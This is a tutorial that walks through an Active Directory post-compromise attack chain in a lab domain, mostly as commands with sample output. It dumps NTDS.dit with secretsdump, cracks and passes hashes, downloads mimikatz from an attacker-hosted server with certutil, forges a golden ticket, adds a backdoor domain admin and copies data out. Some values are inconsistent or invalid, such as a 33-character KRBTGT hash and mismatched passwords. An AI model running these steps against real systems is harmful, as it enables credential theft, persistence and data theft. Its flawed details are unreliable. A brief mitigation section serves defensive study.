# Post-Domain Compromise Attack Strategy: Visual Guide with Examples

## Table of Contents
1. [Post-Domain Compromise Attack Strategy](#post-domain-compromise-attack-strategy)
2. [Dumping the NTDS.dit](#dumping-the-ntdsdit)
3. [Golden Ticket Attacks](#golden-ticket-attacks)
4. [Attack Chain Example](#attack-chain-example)
5. [Mitigation Strategies](#mitigation-strategies)

---

## Post-Domain Compromise Attack Strategy

### What is Post-Domain Compromise?

**Post-domain compromise** refers to the phase after an attacker has gained domain administrator access. At this stage, the attacker has full control over the Active Directory domain and can perform various persistence and lateral movement activities.

### Post-Domain Compromise Strategy

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│            Post-Domain Compromise Attack Strategy               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Domain Admin Access Obtained                                │
│     └─> Compromised domain admin account                        │
│                                                                 │
│  2. Persistence Establishment                                   │
│     ├─> Create new domain admin account                        │
│     ├─> Create golden ticket                                   │
│     └─> Backdoor existing accounts                              │
│                                                                 │
│  3. Credential Harvesting                                       │
│     ├─> Dump NTDS.dit database                                 │
│     ├─> Extract all password hashes                            │
│     └─> Crack hashes offline                                   │
│                                                                 │
│ 4. Lateral Movement                                             │
│     ├─> Access any system in domain                            │
│     ├─> Dump credentials from machines                          │
│     └─> Expand access to other domains                         │
│                                                                 │
│  5. Data Exfiltration                                           │
│     ├─> Access sensitive data                                  │
│     ├─> Copy files and databases                               │
│     └─> Establish covert channels                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Key Objectives

| Objective | Description | Why It Matters |
|-----------|-------------|----------------|
| **Dump NTDS.dit** | Extract all domain password hashes | Complete credential compromise |
| **Create DA account** | Establish persistent domain admin access | Maintain access even if passwords change |
| **Create golden ticket** | Generate unlimited domain access | Access any resource without credentials |
| **Backdoor accounts** | Maintain covert access | Avoid detection |

---

## Dumping the NTDS.dit

### What is NTDS.dit?

**NTDS.dit** is the Active Directory database file that stores all domain information, including user accounts, group memberships, security descriptors, and password hashes.

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    What is NTDS.dit?                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  NTDS.dit is the Active Directory database file                 │
│  Location: C:\Windows\NTDS\NTDS.dit on Domain Controllers       │
│                                                                 │
│  Contains:                                                      │
│  ─────────                                                      │
│  • User accounts and attributes                                │
│  • Group memberships                                            │
│  • Security descriptors                                         │
│  • Password hashes (NTLM and Kerberos)                          │
│  • Computer accounts                                            │
│  • Group Policy objects                                         │
│  • Trust relationships                                          │
│                                                                 │
│  Why It's Valuable:                                             │
│  ────────────────────                                           │
│  • Contains ALL domain password hashes                          │
│  • Allows complete credential compromise                        │
│  • Enables password cracking for all users                     │
│  • Provides persistence mechanism                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### NTDS.dit Structure

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    NTDS.dit Structure                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  NTDS.dit Database                                              │
│  ────────────────────                                           │
│  │                                                               │
│  ├─ Users                                                       │
│  │  ├─ Administrator                                            │
│  │  │  └─ Hash: 31d6cfe0d16ae931b73c59d7e0c089c0               │
│  │  ├─ fcastle                                                  │
│  │  │  └─ Hash: 32ed87bdb5fdc5e9cba88547376818d4               │
│  │  ├─ hawkeye                                                  │
│  │  │  └─ Hash: 3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8a               │
│  │  └─ ...                                                      │
│  │                                                               │
│  ├─ Groups                                                      │
│  │  ├─ Domain Admins                                            │
│  │  ├─ Domain Users                                             │
│  │  └─ ...                                                      │
│  │                                                               │
│  ├─ Computers                                                   │
│  │  ├─ DC01$                                                    │
│  │  ├─ FILESRV$                                                 │
│  │  └─ ...                                                      │
│  │                                                               │
│  └─ Security Descriptors                                        │
│     ├─ ACLs                                                     │
│     ├─ Permissions                                              │
│     └─ ...                                                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Why NT Hash is More Valuable in Domain Attacking Context

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│            NT Hash vs LM Hash in Domain Attacks                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  LM Hash (LAN Manager)                                          │
│  ─────────────────────                                          │
│  • Older, weaker hash algorithm                                 │
│  • Maximum 14 characters                                        │
│  • Case-insensitive                                             │
│  • Easily cracked (rainbow tables)                              │
│  • Often disabled in modern systems                            │
│  • Value: aad3b435b51404eeaad3b435b51404ee (empty)             │
│                                                                 │
│  NT Hash (NTLM)                                                 │
│  ────────────────                                               │
│  • Modern, stronger hash algorithm                              │
│  • Unlimited length                                             │
│  • Case-sensitive                                               │
│  • Used for NTLM authentication                                 │
│  • Required for pass-the-hash attacks                           │
│  • Value: 32ed87bdb5fdc5e9cba88547376818d4                      │
│                                                                 │
│  Why NT Hash is More Valuable:                                  │
│  ───────────────────────────────────                            │
│  1. Used for pass-the-hash attacks                              │
│  2. Required for lateral movement                              │
│  3. Works with modern authentication                            │
│  4. Can be used to create golden tickets                        │
│  5. Provides access to domain resources                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Dumping NTDS.dit Walkthrough

**Step 1: Dump NTDS.dit Using secretsdump.py**

```bash
# Dump NTDS.dit using domain admin account
secretsdump.py MARVEL.local/hawkeye:'Password1'@192.168.138.132 -just-dc-ntlm

# Output example:
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Target system is a Domain Controller
[*] Dumping NTDS.dit
MARVEL.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MARVEL.local\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MARVEL.local\fcastle:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
MARVEL.local\hawkeye:1002:aad3b435b51404eeaad3b435b51404ee:3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8a:::
MARVEL.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2:::
MARVEL.local\IIS_APPPOOL:1101:aad3b435b51404eeaad3b435b51404ee:4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d:::
MARVEL.local\SQLService:1102:aad3b435b51404eeaad3b435b51404ee:5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e:::
MARVEL.local\FileService:1103:aad3b435b51404eeaad3b435b51404ee:6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f:::
```

**Step 2: Extract NT Hashes**

```bash
# Copy output to text file
cat > ntds.txt << 'EOF'
MARVEL.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MARVEL.local\fcastle:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
MARVEL.local\hawkeye:1002:aad3b435b51404eeaad3b435b51404ee:3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8a:::
MARVEL.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2:::
MARVEL.local\IIS_APPPOOL:1101:aad3b435b51404eeaad3b435b51404ee:4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d:::
MARVEL.local\SQLService:1102:aad3b435b51404eeaad3b435b51404ee:5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e:::
MARVEL.local\FileService:1103:aad3b435b51404eeaad3b435b51404ee:6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f:::
EOF

# Extract only NT hashes (third field after splitting by :)
cut -d: -f4 ntds.txt > nt_hashes.txt

# Output example:
31d6cfe0d16ae931b73c59d7e0c089c0
32ed87bdb5fdc5e9cba88547376818d4
3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8a
8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2
4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d
5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e
6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f
```

**Step 3: Crack NT Hashes with Hashcat**

```bash
# Crack NTLM hashes (mode 1000)
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt -O

# Output example:
31d6cfe0d16ae931b73c59d7e0c089c0: (empty password)
32ed87bdb5fdc5e9cba88547376818d4:Password1
3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8a:Password1@
8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2:KRBTGT_Pass123!
4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d:ServicePass123!
5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e:DBPass456!
6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f:FilePass789!
```

**Step 4: Use Cracked Passwords**

```bash
# Use cracked passwords for authentication
crackmapexec smb 192.168.138.0/24 -u Administrator -p "" -d MARVEL.local
crackmapexec smb 192.168.138.0/24 -u fcastle -p Password1 -d MARVEL.local
crackmapexec smb 192.168.138.0/24 -u hawkeye -p Password1@ -d MARVEL.local

# Or use pass the hash
crackmapexec smb 192.168.138.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d MARVEL.local
crackmapexec smb 192.168.138.0/24 -u fcastle -H 32ed87bdb5fdc5e9cba88547376818d4 -d MARVEL.local
crackmapexec smb 192.168.138.0/24 -u hawkeye -H 3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8a -d MARVEL.local
```

### NTDS.dit Dumping Visual Scheme

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Domain    │
│             │                    │ Controller │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Authenticate as domain admin  │
       │     (hawkeye:Password1)          │
       │─────────────────────────────────>│
       │                                  │
       │  2. Request NTDS.dit dump         │
       │     secretsdump.py               │
       │─────────────────────────────────>│
       │                                  │
       │  3. Extract all password hashes  │
       │<─────────────────────────────────│
       │                                  │
       │  4. Extract NT hashes only       │
       │     (skip LM hashes)             │
       │                                  │
       │  5. Crack hashes offline         │
       │     hashcat -m 1000              │
       │                                  │
       │  6. Use cracked passwords        │
       │     for lateral movement         │
       │                                  │
```

---

## Golden Ticket Attacks

### What is a Golden Ticket?

**Golden Ticket** is a forged Kerberos Ticket Granting Ticket (TGT) that allows attackers to access any resource in the domain without valid credentials. It's created using the KRBTGT account hash.

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    What is a Golden Ticket?                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  A Golden Ticket is a forged Kerberos TGT that grants:         │
│                                                                 │
│  • Unlimited access to any domain resource                      │
│  • Access as any user (including domain admin)                  │
│  • No need for valid credentials                                │
│  • Valid until KRBTGT password changes                          │
│                                                                 │
│  How It Works:                                                  │
│  ────────────────                                               │
│  1. Attacker compromises KRBTGT account                         │
│  2. Attacker extracts KRBTGT NTLM hash                          │
│  3. Attacker creates forged TGT using KRBTGT hash               │
│  4. Attacker uses forged TGT to access any resource             │
│                                                                 │
│  Why It's Called "Golden":                                      │
│  ───────────────────────────────────                            │
│  • Provides complete domain control                             │
│  • Works like a master key                                     │
│  • Extremely difficult to detect                                │
│  • Persists until KRBTGT password changes                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### How Golden Ticket Attacks Work

**Visual Scheme:**

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Domain    │
│             │                    │ Controller │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Compromise domain admin       │
       │     (hawkeye:Password1)          │
       │─────────────────────────────────>│
       │                                  │
       │  2. Extract KRBTGT hash          │
       │     lsadump::lsa /inject         │
       │<─────────────────────────────────│
       │     KRBTGT: 8f7a6b5c4d3e2f1a...   │
       │                                  │
       │  3. Create golden ticket          │
       │     kerberos::golden             │
       │     for administrator            │
       │                                  │
       │  4. Pass the ticket              │
       │     kerberos::ptt                │
       │                                  │
       │  5. Access any resource          │
       │     dir \\THEPUNISHER\c$         │
       │─────────────────────────────────>│
       │                                  │
       │  6. Access granted!              │
       │<─────────────────────────────────│
       │                                  │
```

### Golden Ticket Attack Walkthrough

**Step 1: Gain Domain Admin Access**

```bash
# Authenticate as domain admin
crackmapexec smb 192.168.138.132 -u hawkeye -p Password1@ -d MARVEL.local

# Output example:
SMB         192.168.138.132  445    DC01            [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.138.132  445    DC01            [+] MARVEL.local\hawkeye:Password1@ (Pwn3d!)
```

**Step 2: Upload Mimikatz to Domain Controller**

```bash
# Start HTTP server on attacker machine
python3 -m http.server 80

# On domain controller (Windows)
# Open command prompt as administrator
cd C:\Users\hawkeye\Downloads
mkdir mimikatz
cd mimikatz

# Download Mimikatz
certutil -urlcache -split -f http://192.168.138.149/mimikatz.exe mimikatz.exe
```

**Step 3: Run Mimikatz and Enable Debug Privilege**

```bash
# Run Mimikatz
mimikatz.exe

# Enable debug privilege
privilege::debug

# Output example:
Privilege '20' OK
```

**Step 4: Extract KRBTGT Hash**

```bash
# Extract KRBTGT account information
lsadump::lsa /inject /name:krbtgt

# Output example:
Domain : MARVEL.local
Sid    : S-1-5-21-1234567890-1234567890-1234567890

User : krbtgt
RID  : 000002f6 (502)
LM Hash : aad3b435b51404eeaad3b435b51404ee
NT Hash : 8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2
```

**Step 5: Create Golden Ticket**

```bash
# Create golden ticket for administrator
kerberos::golden /User:Administrator /domain:MARVEL.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2 /id:500 /ptt

# Output example:
User : Administrator
Domain : MARVEL.local
SID : S-1-5-21-1234567890-1234567890-1234567890
KRBTGT Hash : 8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2
User ID : 500
[*] Ticket successfully imported!
```

**Golden Ticket Parameters Explained:**

```
┌─────────────────────────────────────────────────────────────────┐
│            Golden Ticket Parameters Explained                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  /User:Administrator                                            │
│  ────────────────────                                           │
│  • Username to impersonate                                      │
│  • Can be any user (real or fake)                              │
│  • Administrator is common choice                               │
│  • Doesn't need to exist in AD                                  │
│                                                                 │
│  /domain:MARVEL.local                                           │
│  ────────────────────────                                       │
│  • Target domain name                                           │
│  • Must match actual domain                                     │
│  • Case-sensitive                                               │
│                                                                 │
│  /sid:S-1-5-21-1234567890-1234567890-1234567890                │
│  ────────────────────────────────────────────────────────────   │
│  • Domain SID (Security Identifier)                             │
│  • Extracted from KRBTGT account                                │
│  • Required for ticket validation                               │
│  • Can be obtained with: whoami /user                           │
│                                                                 │
│  /krbtgt:8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2                      │
│  ────────────────────────────────────────────────────────────   │
│  • KRBTGT account NTLM hash                                     │
│  • Used to sign the ticket                                     │
│  • Most critical parameter                                     │
│  • Never changes (unless reset)                                 │
│                                                                 │
│  /id:500                                                        │
│  ────────                                                       │
│  • User RID (Relative Identifier)                              │
│  • 500 is reserved for administrator                           │
│  • Can be any valid RID                                         │
│  • Determines user privileges                                  │
│                                                                 │
│  /ptt                                                           │
│  ─────                                                           │
│  • Pass the ticket to current session                          │
│  • Makes ticket immediately available                           │
│  • Alternative: /ticket:filename.kirbi (save to file)          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Step 6: Open Command Prompt from Mimikatz Session**

```bash
# Open command prompt from Mimikatz session
misc::cmd

# This opens a new command prompt with the golden ticket applied
```

**Step 7: Test Golden Ticket Access**

```bash
# In the new command prompt, test access to remote machine
dir \\THEPUNISHER\c$

# Output example:
 Volume in drive \\THEPUNISHER\c$ has no label.
 Volume Serial Number is XXXX-XXXX

 Directory of \\THEPUNISHER\c$

01/15/2024  10:30 AM    <DIR>          Windows
01/15/2024  10:30 AM    <DIR>          Program Files
01/15/2024  10:30 AM    <DIR>          Users
01/15/2024  10:30 AM    <DIR>          Program Files (x86)
               0 File(s)              0 bytes
               4 Dir(s)   100 GB free
```

**Step 8: Verify Golden Ticket**

```bash
# Verify current user
whoami

# Output example:
MARVEL\administrator

# Verify privileges
whoami /priv

# Output example:
Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege             Debug programs                 Enabled
SeAssignPrimaryTokenPriv...  Replace a process level token  Enabled
...
```

### Golden Ticket vs Silver Ticket

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│            Golden Ticket vs Silver Ticket                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Golden Ticket                                                  │
│  ────────────────                                               │
│  • Created using KRBTGT hash                                    │
│  • Provides access to ANY service in domain                     │
│  • Full domain control                                          │
│  • Requires domain admin access to create                      │
│  • Valid until KRBTGT password changes                          │
│  • Example: kerberos::golden /User:admin /krbtgt:HASH          │
│                                                                 │
│  Silver Ticket                                                  │
│  ────────────────                                               │
│  • Created using service account hash                           │
│  • Provides access to SPECIFIC service only                     │
│  • Limited to that service                                      │
│  • Requires service account access to create                   │
│  • Valid until service password changes                         │
│  • Example: kerberos::golden /User:admin /target:server /rc4:HASH│
│                                                                 │
│  Key Differences:                                               │
│  ────────────────────                                           │
│  • Golden = KRBTGT hash = Full domain access                    │
│  • Silver = Service hash = Service-specific access              │
│  • Golden is more powerful but harder to obtain                 │
│  • Silver is easier but limited in scope                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Attack Chain Example

### Complete Attack Chain

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│            Complete Post-Domain Compromise Attack Chain         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Phase 1: Initial Access                                        │
│  ────────────────────                                           │
│  • LLMNR poisoning captures fcastle hash                        │
│  • Hash cracked: Password1                                      │
│  • Password sprayed across network                              │
│  • Found hawkeye domain admin account                           │
│                                                                 │
│  Phase 2: Domain Admin Access                                   │
│  ────────────────────────                                       │
│  • Authenticate as hawkeye:Password1@                           │
│  • Gain domain admin privileges                                 │
│  • Access domain controller                                     │
│                                                                 │
│  Phase 3: Credential Harvesting                                 │
│  ────────────────────────                                       │
│  • Dump NTDS.dit database                                       │
│  • Extract all password hashes                                  │
│  • Crack hashes offline                                         │
│  • Obtain KRBTGT hash: 8f7a6b5c4d3e2f1a...                      │
│                                                                 │
│  Phase 4: Golden Ticket Creation                                │
│  ────────────────────────────────                               │
│  • Create golden ticket for administrator                      │
│  • Pass ticket to current session                               │
│  • Access any resource in domain                                │
│                                                                 │
│  Phase 5: Persistence                                           │
│  ────────────────                                               │
│  • Create new domain admin account: backdoor                    │
│  • Add to Domain Admins group                                   │
│  • Set password: BackdoorPass123!                               │
│  • Hide account from detection                                  │
│                                                                 │
│  Phase 6: Lateral Movement                                      │
│  ────────────────────                                           │
│  • Access all machines in domain                                │
│  • Dump credentials from each machine                           │
│  • Expand access to other domains                               │
│  • Establish covert channels                                    │
│                                                                 │
│  Phase 7: Data Exfiltration                                     │
│  ────────────────────────                                       │
│  • Access sensitive data                                        │
│  • Copy files and databases                                     │
│  • Exfiltrate data to external location                         │
│  • Maintain persistent access                                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Example Commands for Complete Attack Chain

```bash
# Phase 1: Initial Access
sudo responder -I eth0 -dwP
# Captured: MARVEL\fcastle::MARVEL:1122334455667788:aabbccddeeff001122334455667788:...
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# Cracked: Password1

# Phase 2: Domain Admin Access
crackmapexec smb 192.168.138.0/24 -u fcastle -p Password1 -d MARVEL.local
# Found: hawkeye domain admin on DC01

# Phase 3: Credential Harvesting
secretsdump.py MARVEL.local/hawkeye:'Password1'@192.168.138.132 -just-dc-ntlm
# Extracted KRBTGT: 8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2

# Phase 4: Golden Ticket Creation
mimikatz.exe
privilege::debug
kerberos::golden /User:Administrator /domain:MARVEL.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2 /id:500 /ptt
misc::cmd

# Phase 5: Persistence
net user backdoor BackdoorPass123! /add /domain
net group "Domain Admins" backdoor /ADD /DOMAIN

# Phase 6: Lateral Movement
dir \\THEPUNISHER\c$
dir \\IRONMAN\c$
dir \\BLACKWIDOW\c$

# Phase 7: Data Exfiltration
copy \\THEPUNISHER\c$\sensitive\data.zip C:\exfil\
```

---

## Mitigation Strategies

### NTDS.dit Dumping Mitigation

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Protect domain controllers** | Prevent unauthorized access | Restrict DC access, use jump servers |
| **Monitor for suspicious activity** | Detect credential dumping | Monitor for secretsdump usage |
| **Implement least privilege** | Limit damage from compromise | Use just-in-time administration |
| **Regular password audits** | Identify weak passwords | Audit password policies regularly |
| **Enable advanced auditing** | Track credential access | Enable credential logging |

### Golden Ticket Mitigation

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Protect KRBTGT account** | Prevent golden ticket creation | Never share KRBTGT password |
| **Regular KRBTGT password rotation** | Invalidate golden tickets | Rotate KRBTGT password regularly |
| **Monitor for unusual ticket activity** | Detect golden ticket usage | Monitor Kerberos event logs |
| **Implement Kerberos armoring** | Additional ticket protection | Enable FAST (Flexible Authentication Secure Tunneling) |
| **Use Protected Users group** | Prevent credential caching | Add sensitive accounts to Protected Users |

### General Post-Compromise Mitigation

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Implement least privilege** | Limit lateral movement | Use just-in-time administration |
| **Regular security audits** | Detect suspicious activity | Audit privileged access regularly |
| **Monitor for unusual activity** | Detect compromise early | Implement SIEM solutions |
| **Incident response plan** | Respond to compromises effectively | Have a tested IR plan |
| **Security awareness training** | Reduce phishing risk | Train users on security best practices |

---

## Summary

### Key Takeaways

```
┌─────────────────────────────────────────────────────────────────┐
│                    Key Takeaways                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. NTDS.dit contains ALL domain password hashes               │
│  2. NT hashes are more valuable than LM hashes                 │
│  3. Golden tickets provide unlimited domain access              │
│  4. KRBTGT hash is the key to golden tickets                   │
│  5. Golden tickets persist until KRBTGT password changes       │
│  6. Post-domain compromise requires comprehensive mitigation    │
│  7. Regular KRBTGT password rotation is critical               │
│  8. Monitoring and auditing are essential for detection        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Attack Techniques Summary

| Attack | Purpose | Tools |
|--------|---------|-------|
| **NTDS.dit dumping** | Extract all domain password hashes | secretsdump.py |
| **NT hash cracking** | Obtain plaintext passwords | Hashcat |
| **Golden ticket creation** | Unlimited domain access | Mimikatz |
| **Persistence** | Maintain domain admin access | net user, net group |

### Critical Parameters

```
┌─────────────────────────────────────────────────────────────────┐
│            Critical Parameters for Golden Tickets               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Domain SID: S-1-5-21-1234567890-1234567890-1234567890         │
│  KRBTGT Hash: 8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2                  │
│  User ID: 500 (administrator)                                   │
│  Domain: MARVEL.local                                          │
│                                                                 │
│  Command:                                                       │
│  kerberos::golden /User:Administrator /domain:MARVEL.local      │
│    /sid:S-1-5-21-1234567890-1234567890-1234567890              │
│    /krbtgt:8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2 /id:500 /ptt       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```
